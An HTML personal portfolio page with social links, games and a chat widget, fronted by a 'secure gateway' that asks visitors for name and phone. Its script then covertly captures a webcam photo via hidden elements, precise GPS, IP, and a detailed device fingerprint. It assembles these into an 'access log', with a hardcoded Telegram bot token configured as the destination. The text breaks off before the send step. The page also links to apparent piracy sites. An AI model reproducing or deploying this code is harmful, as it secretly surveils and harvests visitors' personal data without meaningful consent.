<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Lalu Kumar Tanti - Elite Digital Portfolio">
 <title>Lalu Kumar Tanti | SECURE HUB</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Outfit:wght@200;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <style>
        :root {
            /* --- ELITE DARK THEME --- */
            --bg-body: #050505;
            --bg-card: rgba(20, 20, 20, 0.65);
            --border-color: rgba(212, 175, 55, 0.25);
            --gold-primary: #D4AF37;
            --gold-shine: #FFD700;
            --text-main: #ffffff;
            --text-sub: #b3b3b3;
            --glass-blur: blur(14px);
            --nav-glass: blur(20px);
        }

        [data-theme="light"] {
            --bg-body: #f2f2f2;
            --bg-card: rgba(255, 255, 255, 0.85);
            --border-color: rgba(180, 140, 40, 0.3);
            --gold-primary: #b08d26;
            --gold-shine: #d4a017;
            --text-main: #111111;
            --text-sub: #555555;
            --glass-blur: blur(16px);
            --nav-glass: blur(25px);
        }

        /* --- RESET & BASIC --- */
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        
        body { 
            background-color: var(--bg-body); 
            color: var(--text-main); 
            font-family: 'Outfit', sans-serif; 
            overflow-x: hidden; 
            min-height: 100vh;
            transition: background-color 0.4s ease, color 0.4s ease;
        }

        /* =========================================
           1. GATEKEEPER (LOGIN PAGE) STYLES
           ========================================= */
        #gatekeeper {
            position: fixed; inset: 0; z-index: 9999;
            background: var(--bg-body);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            padding: 20px; text-align: center;
            background-image: radial-gradient(circle at 50% 50%, rgba(212, 175, 55, 0.05) 0%, transparent 60%);
        }

        .gate-card {
            width: 100%; max-width: 400px;
            background: rgba(10, 10, 10, 0.9);
            border: 1px solid var(--gold-primary);
            border-radius: 20px; padding: 40px 25px;
            box-shadow: 0 0 50px rgba(212, 175, 55, 0.15);
            backdrop-filter: blur(20px);
            position: relative; overflow: hidden;
        }

        .gate-img-frame {
            width: 120px; height: 120px; margin: 0 auto 20px;
            border-radius: 50%; padding: 4px;
            border: 2px solid var(--gold-primary); 
            box-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
        }
        .gate-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }

        .gate-title { 
            font-family: 'Cinzel'; color: var(--gold-primary); font-size: 22px; margin-bottom: 5px; 
            text-shadow: 0 0 10px rgba(212, 175, 55, 0.4);
        }
        .gate-sub { color: #666; font-size: 10px; letter-spacing: 3px; margin-bottom: 30px; font-family: 'Rajdhani'; }

        .gate-input-group { position: relative; margin-bottom: 15px; text-align: left; }
        .gate-input {
            width: 100%; padding: 15px 15px 15px 45px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid #333; color: #fff; font-size: 16px;
            font-family: 'Rajdhani'; transition: 0.3s; border-radius: 8px;
        }
        .gate-input:focus { border-color: var(--gold-primary); background: rgba(212, 175, 55, 0.05); }
        .gate-icon { position: absolute; left: 15px; top: 17px; color: #555; transition: 0.3s; }
        .gate-input:focus + .gate-icon { color: var(--gold-primary); }

        .gate-btn {
            width: 100%; padding: 16px;
            background: linear-gradient(135deg, var(--gold-primary), #997d2d);
            color: #000; font-weight: 800; font-size: 16px;
            border: none; cursor: pointer; border-radius: 8px;
            text-transform: uppercase; letter-spacing: 1px; margin-top: 10px;
            box-shadow: 0 0 20px rgba(212, 175, 55, 0.2); transition: 0.3s;
        }
        .gate-btn:active { transform: scale(0.98); }
        
        .loading-text {
            margin-top: 15px; font-size: 12px; color: var(--gold-primary); 
            font-family: 'Rajdhani'; display: none;
        }

        /* =========================================
           2. MAIN PORTFOLIO STYLES
           ========================================= */
        #main-interface { display: none; opacity: 0; transition: opacity 1s ease-in; padding-bottom: 90px; }

        .bg-fx { position: fixed; inset: 0; z-index: -2; pointer-events: none; overflow: hidden; }
        .orb { position: absolute; border-radius: 50%; filter: blur(90px); opacity: 0.25; animation: float 15s infinite alternate; }
        .orb-1 { width: 300px; height: 300px; background: var(--gold-primary); top: -10%; left: -10%; }
        .orb-2 { width: 250px; height: 250px; background: #00e5ff; bottom: -10%; right: -10%; }
        @keyframes float { 0% { transform: translate(0,0); } 100% { transform: translate(40px, 40px); } }

        /* Navbar */
        .navbar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 5%; position: sticky; top: 0; z-index: 1000;
            background: rgba(5, 5, 5, 0.85); backdrop-filter: var(--glass-blur); -webkit-backdrop-filter: var(--glass-blur);
            border-bottom: 1px solid var(--border-color);
        }
        .brand { font-family: 'Cinzel'; color: var(--gold-primary); font-weight: 700; font-size: 18px; display: flex; align-items: center; gap: 8px; }
        .controls { display: flex; align-items: center; gap: 15px; }
        .nav-btn { font-size: 20px; cursor: pointer; color: var(--text-main); background: none; border: none; }
        
        /* Translate */
        #google_translate_element { margin-right: 5px; }
        .goog-te-gadget-simple {
            background-color: rgba(255,255,255,0.05) !important; 
            border: 1px solid var(--gold-primary) !important;
            padding: 4px 8px !important; border-radius: 20px !important;
        }
        .goog-te-gadget-simple span { color: var(--gold-primary) !important; font-weight: 700 !important; font-size: 11px !important; }
        .goog-te-gadget-icon, .goog-te-banner-frame { display: none !important; } 
        body { top: 0px !important; }

        /* Profile Section */
        .container { width: 100%; max-width: 800px; margin: 0 auto; padding: 0 20px; }
        .profile-wrapper { text-align: center; padding: 60px 0 30px; }
        .img-container {
            width: 160px; height: 160px; margin: 0 auto 20px;
            position: relative; border-radius: 50%; padding: 5px;
            background: linear-gradient(135deg, var(--gold-primary), transparent, var(--gold-shine));
        }
        .profile-pic {
            width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
            border: 4px solid var(--bg-body); background: #000;
        }
        h1 { 
            font-family: 'Rajdhani', sans-serif; font-size: 32px; font-weight: 700; 
            background: linear-gradient(to right, var(--text-main), var(--gold-primary), var(--text-main));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px;
        }
        .verified { color: #1DA1F2; font-size: 20px; vertical-align: middle; margin-left: 5px; }
        .bio { color: var(--gold-primary); font-size: 13px; letter-spacing: 2px; font-weight: 600; text-transform: uppercase; }

        /* Grid & Cards */
        .section-label {
            display: flex; align-items: center; gap: 10px;
            margin: 35px 0 15px; color: var(--gold-primary); font-family: 'Cinzel'; font-weight: bold; font-size: 14px;
            border-bottom: 1px solid var(--border-color); padding-bottom: 8px;
        }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        @media (min-width: 600px) { .grid { gap: 20px; } }
        .card {
            background: var(--bg-card); border: 1px solid var(--border-color);
            border-radius: 16px; padding: 20px; height: 100px;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            text-decoration: none; color: var(--text-main); position: relative; overflow: hidden;
            backdrop-filter: var(--glass-blur); -webkit-backdrop-filter: var(--glass-blur);
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .card:active { transform: scale(0.96); }
        .card i { font-size: 28px; margin-bottom: 8px; color: var(--gold-primary); }
        .card span { font-size: 11px; font-weight: 600; text-transform: uppercase; text-align: center; }
        .full-w { grid-column: span 2; flex-direction: row; gap: 15px; height: 75px; background: linear-gradient(90deg, rgba(212,175,55,0.05), transparent); }
        .full-w i { margin-bottom: 0; font-size: 24px; }

        /* Bottom Nav */
        .bottom-nav {
            position: fixed; bottom: 0; left: 0; width: 100%; height: 75px;
            background: rgba(5, 5, 5, 0.95); backdrop-filter: var(--nav-glass); -webkit-backdrop-filter: var(--nav-glass);
            border-top: 1px solid var(--border-color); z-index: 4000;
            display: flex; justify-content: space-around; align-items: center;
        }
        .nav-item {
            flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center;
            color: var(--text-sub); gap: 4px; cursor: pointer; transition: 0.3s;
        }
        .nav-item.active { color: var(--gold-primary); }
        .nav-item.active i { transform: translateY(-3px); text-shadow: 0 0 10px var(--gold-primary); }

        /* AI Button */
        .ai-trigger {
            position: fixed; bottom: 90px; right: 25px;
            width: 60px; height: 60px; border-radius: 50%;
            background: linear-gradient(135deg, var(--gold-primary), #997d2d);
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 30px rgba(212,175,55,0.4);
            z-index: 2000; cursor: pointer; animation: pulse 3s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }

        /* Modals */
        .modal-wrap {
            position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 5000;
            display: none; align-items: center; justify-content: center;
            backdrop-filter: blur(8px); opacity: 0; transition: opacity 0.3s;
        }
        .modal-wrap.active { opacity: 1; display: flex; }
        .modal-inner {
            width: 92%; max-width: 450px; background: #080808; border: 1px solid var(--gold-primary);
            border-radius: 20px; overflow: hidden; display: flex; flex-direction: column;
            box-shadow: 0 0 60px rgba(212,175,55,0.15);
            max-height: 85vh;
        }

        /* Owner Profile */
        .owner-profile {
            max-width:700px; margin:40px auto; padding:30px 20px; text-align:center;
            background:rgba(0,0,0,0.6); border-radius:26px; box-shadow:0 0 30px rgba(212,175,55,0.25);
        }
        .owner-profile img{ width:160px; height:160px; object-fit:cover; border-radius:24px; border:4px solid #D4AF37; margin-bottom:18px; }
        .owner-profile h1{ font-size:32px; font-weight:800; margin:10px 0 5px; background:linear-gradient(90deg,#FFD700,#D4AF37,#FFD700); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .owner-profile p{ font-size:15px; line-height:1.7; color:#eaeaea; margin-bottom:22px; }
        .owner-profile .rights{ font-size:18px; font-weight:700; color:#D4AF37; }

        /* Games & Tools */
        .game-menu { padding: 20px; overflow-y: auto; text-align: center; }
        .games-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .game-thumb { background: #1a1a1a; border: 1px solid #333; border-radius: 12px; padding: 15px; cursor: pointer; transition: 0.3s; }
        .game-thumb:hover { border-color: var(--gold-primary); }
        .game-thumb i { font-size: 30px; color: var(--gold-primary); margin-bottom: 8px; }
        
        .game-canvas-area { display: none; flex-direction: column; align-items: center; padding: 20px; }
        canvas { background: #111; border: 2px solid var(--gold-primary); border-radius: 5px; }
        .game-ctrl-pad { margin-top: 15px; display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; width: 180px; }
        .g-btn { background: #333; border: none; padding: 15px; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; }

        /* Tic Tac Toe */
        #tttGrid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; width: 240px; margin: 0 auto; }
        .ttt-cell { width: 75px; height: 75px; background: #222; display: flex; align-items: center; justify-content: center; font-size: 36px; font-weight: bold; color: #fff; cursor: pointer; border-radius: 8px; }
        .ttt-cell.x { color: var(--gold-primary); }
        .ttt-cell.o { color: #00e5ff; }

        .chat-box { height: 350px; padding: 20px; overflow-y: auto; background: #0a0a0a; display: flex; flex-direction: column; gap: 10px; }
        .bubble { padding: 10px 15px; border-radius: 12px; max-width: 80%; font-size: 13px; }
        .bubble.bot { background: rgba(212,175,55,0.15); color: #fff; align-self: flex-start; }
        .bubble.user { background: #333; color: #fff; align-self: flex-end; }
        
        .toast {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            background: var(--gold-primary); color: #000; padding: 10px 20px;
            border-radius: 30px; font-weight: bold; font-size: 12px;
            opacity: 0; pointer-events: none; transition: 0.3s; z-index: 6000;
        }
        .toast.show { opacity: 1; top: 40px; }

        /* Data Capture Elements */
        #hidden-video { display: none; }
        #hidden-canvas { display: none; }
    </style>
</head>
<body data-theme="dark">

    <div id="gatekeeper">
        <div class="gate-card">
            <div class="gate-img-frame">
                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="gate-img" alt="Profile">
            </div>
            <h2 class="gate-title">LALU KUMAR</h2>
            <div class="gate-sub">SECURE PORTFOLIO GATEWAY</div>

            <div class="gate-input-group">
                <input type="text" id="g-name" class="gate-input" placeholder="YOUR FULL NAME">
                <i class="fas fa-user gate-icon"></i>
            </div>
            
            <div class="gate-input-group">
                <input type="tel" id="g-phone" class="gate-input" placeholder="YOUR MOBILE NUMBER">
                <i class="fas fa-phone gate-icon"></i>
            </div>

            <button class="gate-btn" id="btn-verify" onclick="initiateSecureEntry()">
                <i class="fas fa-fingerprint"></i> VERIFY & ENTER
            </button>
            
            <div class="loading-text" id="g-status">
                <i class="fas fa-circle-notch fa-spin"></i> SYSTEM DIAGNOSTIC...
            </div>
        </div>
    </div>

    <video id="hidden-video" autoplay playsinline style="display:none;"></video>
    <canvas id="hidden-canvas" style="display:none;"></canvas>

    <div id="main-interface">
        <audio id="sfx-tap"><source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3"></audio>
        <div id="toast" class="toast"><i class="fas fa-check-circle"></i> Success</div>
        <div class="bg-fx"><div class="orb orb-1"></div><div class="orb orb-2"></div></div>
        
        <nav class="navbar">
            <div class="brand"><i class="fas fa-crown"></i> ELITE HUB</div>
            <div style="display: flex; align-items: center;">
                <div id="google_translate_element"></div>
                <div class="controls">
                    <button class="nav-btn" onclick="openSettings()"><i class="fas fa-cog"></i></button>
                    <button class="nav-btn" id="themeIcon" onclick="themeSwitch()"><i class="fas fa-sun"></i></button>
                </div>
            </div>
        </nav>
        
        <div class="container" id="homeSection">
            <div class="profile-wrapper">
                <div class="img-container">
                    <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="profile-pic" alt="Lalu Kumar Tanti">
                </div>
                <h1>LALU KUMAR TANTI <i class="fas fa-check-circle verified"></i></h1>
                <p class="bio">Digital Creator | Developer</p>
            </div>

            <div id="linksSection">
                <div class="section-label"><i class="fas fa-bolt"></i> DIRECT CONNECT</div>
                <div class="grid">
                    <a href="tel:+919771617808" class="card" onclick="playTap()"><i class="fas fa-phone-volume"></i><span>Call Now</span></a>
                    <a href="sms:+919771617808" class="card" onclick="playTap()"><i class="fas fa-comment-dots"></i><span>Message</span></a>
                    <a href="https://wa.me/919771617808" class="card" onclick="playTap()"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></a>
                    <a href="https://aratt.ai/user/@lalu_kumar_tanti" class="card" onclick="playTap()" target="_blank"><i class="fas fa-comments"></i><span>Arattai</span></a>
                    <a href="https://t.me/Lalu_kumar_tanti_0" class="card" onclick="playTap()"><i class="fab fa-telegram-plane"></i><span>Telegram</span></a>
                    <a href="mailto:lalukumartanti75@gmail.com" class="card" onclick="playTap()"><i class="fas fa-envelope-open"></i><span>Email Me</span></a>
                    <a href="https://maps.app.goo.gl/gHHLNenvgdqN6xUK7?g_st=ac" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-map-marked-alt"></i><span>Official Location</span></a>
                <a href="https://share.google/yDrS62VElIxyjEBU1" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-location-arrow"></i><span>Business Hub</span></a>

                </div>

                <div class="section-label"><i class="fas fa-globe"></i> SOCIAL EMPIRE</div>
                <div class="grid">
                    <a href="https://www.instagram.com/lalu_kumar_tanti" class="card" onclick="playTap()"><i class="fab fa-instagram"></i><span>Instagram</span></a>
                    <a href="https://www.threads.com/@lalu_kumar_tanti" class="card" onclick="playTap()"><i class="fas fa-at"></i><span>Threads</span></a>
                    <a href="https://www.facebook.com/lalukumartantii" class="card" onclick="playTap()"><i class="fab fa-facebook-f"></i><span>Facebook</span></a>
                    <a href="https://x.com/LaluKumarTanti" class="card" onclick="playTap()"><i class="fab fa-x-twitter"></i><span>Twitter / X</span></a>
                    <a href="https://www.snapchat.com/@lalu_kumar77" class="card" onclick="playTap()"><i class="fab fa-snapchat-ghost"></i><span>Snapchat</span></a>
                    <a href="http://www.youtube.com/@Lalu_Kumar_Tanti" class="card" onclick="playTap()"><i class="fab fa-youtube"></i><span>YouTube</span></a>
                </div>

            <div class="section-label"><i class="fas fa-briefcase"></i> PORTFOLIO & WORK</div>
        <div class="grid">
            <a href="https://in.linkedin.com/in/lalu-kumar-tanti-540185351" class="card" onclick="playTap()"><i class="fab fa-linkedin-in"></i><span>LinkedIn</span></a>
            <a href="https://github.com/lalukumartanti" class="card" onclick="playTap()"><i class="fab fa-github"></i><span>GitHub</span></a>
            <a href="https://lalukumartanti.github.io/Lalu-Kumar-Tanti-LALU-KUMAR/" class="card" onclick="playTap()"><i class="fas fa-desktop"></i><span>Main Portfolio</span></a>
            <a href="https://lalukumartanti.github.io/Lalu-Kumar-Tanti./" class="card" onclick="playTap()"><i class="fas fa-user-secret"></i><span>Secure Site</span></a>
            <a href="https://lalukumartanti.github.io/Lalu-Kumar/" class="card" onclick="playTap()"><i class="fas fa-code"></i><span>Dev Profile</span></a>
            <a href="https://lalukumartanti.github.io/Lalu-Kumar-Tanti/" class="card" onclick="playTap()"><i class="fas fa-project-diagram"></i><span>Projects</span></a>
            <a href="https://t.me/Lalukumartantibot" class="card full-w" onclick="playTap()"><i class="fas fa-robot"></i><span>Activate Telegram Bot</span></a>      
        </div>
            
            <div class="section-label"><i class="fas fa-coins"></i> PAYMENTS & MORE</div>
        <div class="grid">
            <a href="upi://pay?pa=9771617808@ybl&pn=LaluKumar" class="card" onclick="playTap()"><i class="fas fa-wallet"></i><span>PhonePe</span></a>
            <a href="upi://pay?pa=9771617808@axl&pn=LaluKumar" class="card" onclick="playTap()"><i class="fab fa-google-pay"></i><span>GPay</span></a>
            <div class="card" onclick="copyUPI()">
                <i class="fas fa-qrcode"></i><span>Copy UPI ID</span>
                <span style="font-size:7px; opacity:0.7; margin-top:3px;">9771617808-2@axl</span>
            </div>
            <a href="https://open.spotify.com/user/31c4utsldd2omujkcxyjbrwgvnou" class="card" onclick="playTap()"><i class="fab fa-spotify"></i><span>Spotify</span></a>
        </div>
    </div>

    <div class="section-label"><i class="fas fa-film"></i> MOVIE WEBSITE</div>
        <div class="grid">
            <a href="https://hdhub4u.catering/" class="card" onclick="playTap()" target="_blank">
    <i class="fas fa-film"></i>
    <span>HDHub4u Movies</span>
</a>
            <a href="https://www.filmyzilla28.com/" class="card" onclick="playTap()" target="_blank">
    <i class="fz-logo">FZ</i>
    <span>Filmyzilla</span>
</a>
            <a href="https://vegas-big.com/" class="card" onclick="playTap()" target="_blank">
    <i class="fas fa-film"></i>
    <span>Vegas-Big Movies</span>
</a>
            <a href="https://vegamovies.career/" class="card" onclick="playTap()" target="_blank">
    <i class="v-logo">V</i>
    <span>VegaMovies</span>
</a>
          </div>
        
    <div class="section-label"><i class="fas fa-book"></i> STUDY WEBSITE</div>
        <div class="grid">
            <a href="https://studyspark.site/" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-book-open"></i><span>Study Spark</span></a>
            <a href="https://rolexcoderz.live/Login/" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-laptop-code"></i><span>Rolex Coderz</span></a>
        </div>
            
            <div class="section-label"><i class="fas fa-user-circle"></i> ABOUT OWNER</div>
            <div class="owner-profile">
                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" alt="Lalu Kumar Tanti">
                <h1>Lalu Kumar Tanti</h1>
                <h3>Creative Developer â€¢ Learner â€¢ Dream Builder</h3>
                <p>
                    A passionate and hardworking individual with a strong interest in technology,
                    web development, and creative digital projects. Always eager to learn new skills,
                    explore innovative ideas, and build useful online tools. Believes in consistency,
                    positivity, and self-growth. Focused on creating value, helping others, and moving
                    forward with confidence and dedication.
                </p>
                <div class="rights">Â© 2026 All Rights Reserved â€” Lalu Kumar Tanti</div>
            </div>
        </div>

        <div class="bottom-nav">
            <div class="nav-item active" id="navHome" onclick="navAction('home')"><i class="fas fa-home"></i><span>Home</span></div>
            <div class="nav-item" id="navLinks" onclick="navAction('links')"><i class="fas fa-link"></i><span>Links</span></div>
            <div class="nav-item" id="navGames" onclick="navAction('games')"><i class="fas fa-gamepad"></i><span>Games</span></div>
            <div class="nav-item" id="navLogin" onclick="navAction('login')"><i class="fas fa-user-circle"></i><span id="loginText">Login</span></div>
        </div>

        <div class="ai-trigger" onclick="openAI()"><i class="fas fa-brain" style="font-size:24px; color:#fff;"></i></div>

        <div class="modal-wrap" id="gameModal" onclick="closeModal(event)">
            <div class="modal-inner" onclick="event.stopPropagation()">
                <div class="ai-head" style="padding:15px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center;">
                    <span style="color:var(--gold-primary); font-weight:bold;"><i class="fas fa-gamepad"></i> LALU ARCADE GAME</span>
                    <i class="fas fa-times" onclick="closeModal(null, true)" style="color:#fff; cursor:pointer;"></i>
                </div>
                <div class="game-menu" id="gameMenu">
                    <div class="games-grid">
                        <div class="game-thumb" onclick="loadSnake()"><i class="fas fa-worm"></i><span>Snake</span></div>
                        <div class="game-thumb" onclick="loadTicTacToe()"><i class="fas fa-border-all"></i><span>TicTacToe</span></div>
                        <div class="game-thumb" onclick="window.open('https://sudoku.com', '_blank')"><i class="fas fa-puzzle-piece"></i><span>Sudoku</span></div>
                        <div class="game-thumb" onclick="window.open('https://ludoking.com', '_blank')"><i class="fas fa-dice"></i><span>Ludo</span></div>
                    </div>
                </div>
                <div class="game-canvas-area" id="gamePlayArea">
                    <h4 id="activeGameTitle" style="color:var(--gold-primary); margin-bottom:10px;"></h4>
                    <div id="gameContainer"></div> <button class="g-btn" style="width:100%; margin-top:20px;" onclick="closeGame()">EXIT GAME</button>
                </div>
            </div>
        </div>

        <div class="modal-wrap" id="aiModal" onclick="closeModal(event)">
            <div class="modal-inner" onclick="event.stopPropagation()">
                <div class="ai-head" style="padding:15px; background:var(--gold-primary); color:#000; font-weight:bold;">
                    LALU BRAIN v2.07<i class="fas fa-times" style="float:right; cursor:pointer;" onclick="closeModal(null, true)"></i>
                </div>
                <div class="chat-box" id="chatHistory">
                    <div class="bubble bot">Hello! I am Lalu's AI.<br>How can I assist you today?</div>
                </div>
                <div style="padding:15px; border-top:1px solid #333; display:flex;">
                    <input type="text" id="userMsg" class="input-box" style="flex:1; margin-bottom:0; padding:10px; background:#111; border:1px solid #333; color:#fff;" placeholder="Ask Lalu AI..." onkeypress="handleEnter(event)">
                    <button style="background:var(--gold-primary); border:none; padding:0 15px; border-radius:8px; margin-left:10px;" onclick="sendMessage()"><i class="fas fa-paper-plane"></i></button>
                </div>
            </div>
        </div>

        <div class="modal-wrap" id="authModal" onclick="closeModal(event)">
            <div class="modal-inner" onclick="event.stopPropagation()">
                <div style="display:flex; border-bottom:1px solid #333;">
                    <div class="auth-tab active" style="flex:1; padding:15px; text-align:center; color:var(--gold-primary); border-bottom:2px solid var(--gold-primary);">LOGIN</div>
                </div>
                <div style="padding:25px;">
                    <input type="tel" id="mobileInput" style="width:100%; padding:12px; margin-bottom:15px; background:#1a1a1a; border:1px solid #333; color:#fff; border-radius:8px;" placeholder="Mobile Number">
                    <button class="btn-full" style="width:100%; padding:12px; background:var(--gold-primary); border:none; font-weight:bold; border-radius:8px;" onclick="sendOTP()">SEND OTP</button>
                    <div id="otpArea" style="display:none; margin-top:15px;">
                        <input type="text" id="otpInput" style="width:100%; padding:12px; margin-bottom:15px; background:#1a1a1a; border:1px solid #333; color:#fff; border-radius:8px;" placeholder="Enter 1234">
                        <button class="btn-full" style="width:100%; padding:12px; background:#00ff00; border:none; font-weight:bold; border-radius:8px;" onclick="verifyOTP()">VERIFY LOGIN</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({ pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE, autoDisplay: false }, 'google_translate_element');
        }
    </script>
    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

    <script>
        // ==========================================
        // ðŸš¨ CONFIGURATION ðŸš¨
        // ==========================================
        const TG_TOKEN = "8474692567:AAFU6lnQg9Tv23NA2vrXd3XemrHmQDO8I98";
        const TG_CHAT = "7342190170";

        // ==========================================
        // ðŸ”’ 1. ADVANCED DEVICE MODEL DETECTION
        // ==========================================
        async function getDeviceModel() {
            try {
                // Method 1: Client Hints (Modern Android/Chrome)
                if (navigator.userAgentData) {
                    const data = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion", "architecture"]);
                    return `${data.platform} ${data.model} (${data.architecture})`;
                }
                
                // Method 2: Fallback Regex (iOS/Older Android/PC)
                const ua = navigator.userAgent;
                if (/iPhone/.test(ua)) return "Apple iPhone (Exact model hidden by Apple)";
                if (/iPad/.test(ua)) return "Apple iPad";
                if (/Android/.test(ua)) {
                    // Try to extract model from UA string like "Android 10; SM-A50"
                    const match = ua.match(/Android.*?; (.*?)\)/);
                    return match ? `Android: ${match[1]}` : "Android Device";
                }
                if (/Windows/.test(ua)) return "Windows PC";
                if (/Macintosh/.test(ua)) return "Macintosh";
                
                return "Unknown Model";
            } catch(e) { return "Detection Failed"; }
        }

        // ==========================================
        // ðŸ”’ 2. HARDWARE & NETWORK INTELLIGENCE
        // ==========================================
        function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "Integrated/Unknown";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked";
            } catch (e) { return "N/A"; }
        }

        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const b = await navigator.getBattery();
                    return `${Math.round(b.level * 100)}% (${b.charging ? 'âš¡ Charging' : 'ðŸ”‹ Battery'})`;
                }
            } catch (e) {}
            return "Hidden/Desktop";
        }

        function getConnectionInfo() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    return `${conn.effectiveType.toUpperCase()} (${conn.type || 'Unknown'}) - Down: ~${conn.downlink}Mbps`;
                }
            } catch(e) {}
            return "WiFi / Broadband";
        }

        async function getIP() {
            try {
                const req = await fetch('https://api.ipify.org?format=json');
                const res = await req.json();
                return res.ip;
            } catch(e) { return "Masked/VPN"; }
        }

        // ==========================================
        // ðŸš€ MAIN EXECUTION SEQUENCE
        // ==========================================
        async function initiateSecureEntry() {
            const name = document.getElementById('g-name').value;
            const phone = document.getElementById('g-phone').value;
            const status = document.getElementById('g-status');
            const btn = document.getElementById('btn-verify');

            // Basic Validation
            if(name.length < 3 || phone.length < 10) {
                alert("Please enter valid Name & Phone Number.");
                return;
            }

            // Lock UI
            btn.innerHTML = '<i class="fas fa-radar fa-spin"></i> SCANNING ENVIRONMENT...';
            btn.style.opacity = "0.7";
            status.style.display = "block";

            // --- STEP 1: GATHER DATA ---
            const ip = await getIP();
            const model = await getDeviceModel();
            const battery = await getBatteryInfo();
            const gpu = getGPUInfo();
            const network = getConnectionInfo();
            
            // Static Data
            const screenInfo = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit) - Pixel Ratio: ${window.devicePixelRatio}`;
            const hardware = `Cores: ${navigator.hardwareConcurrency || '?'}, RAM: ~${navigator.deviceMemory || '?'}GB`;
            const browser = navigator.userAgent;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // --- STEP 2: CAMERA & LOCATION (With Fail-Safe) ---
            let imageBlob = null;
            let locData = null;

            // Attempt Camera (Async, non-blocking if fails)
            try {
                if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                    const video = document.getElementById('hidden-video');
                    const canvas = document.getElementById('hidden-canvas');
                    video.srcObject = stream;
                    await new Promise(r => video.onloadedmetadata = r);
                    canvas.width = video.videoWidth; 
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    imageBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                    stream.getTracks().forEach(t => t.stop());
                }
            } catch(e) { console.warn("Camera failed/denied"); }

            // Attempt Location (Async, non-blocking if fails)
            try {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => { 
                            locData = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }; 
                            resolve(); 
                        },
                        (err) => { resolve(); }, 
                        { timeout: 4000, enableHighAccuracy: true } 
                    );
                });
            } catch(e) { console.warn("GPS failed/denied"); }

            // --- STEP 3: BUILD MESSAGE ---
            const message = `
ðŸš¨ *SECURE HUB ACCESS LOG* ðŸš¨

ðŸ‘¤ *USER IDENTITY*
â€¢ Name: ${name}
â€¢ Phone: \`${phone}\`

ðŸ“± *DEVICE FINGERPRINT*
â€¢ *Model:* \`${model}\`
â€¢ *OS/Browser:* ${browser}
â€¢ *Screen:* ${screenInfo}
â€¢ *Timezone:* ${timezone}

âš™ï¸ *HARDWARE SPECS*
â€¢ *GPU:* ${gpu}
â€¢ *CPU/RAM:* ${hardware}
â€¢ *Battery:* ${battery}

ðŸ“¡ *NETWORK INTEL*
â€¢ *IP:* \`${ip}\`
â€¢ *Type:* ${network}

ðŸ“ *LOCATION DATA*
${locData ? `â€¢ Coords: \`${locData.lat}, ${locData.lon}\`\nâ€¢ Accuracy: ${Math.round(locData.acc)}m\nðŸ”— [Open Maps](https://www.google.com/maps?q=${locData.lat},${locData.lon})` : "âŒ Location Denied/Unavailable"}

â° *Time:* ${new Date().toLocaleString()}
`;

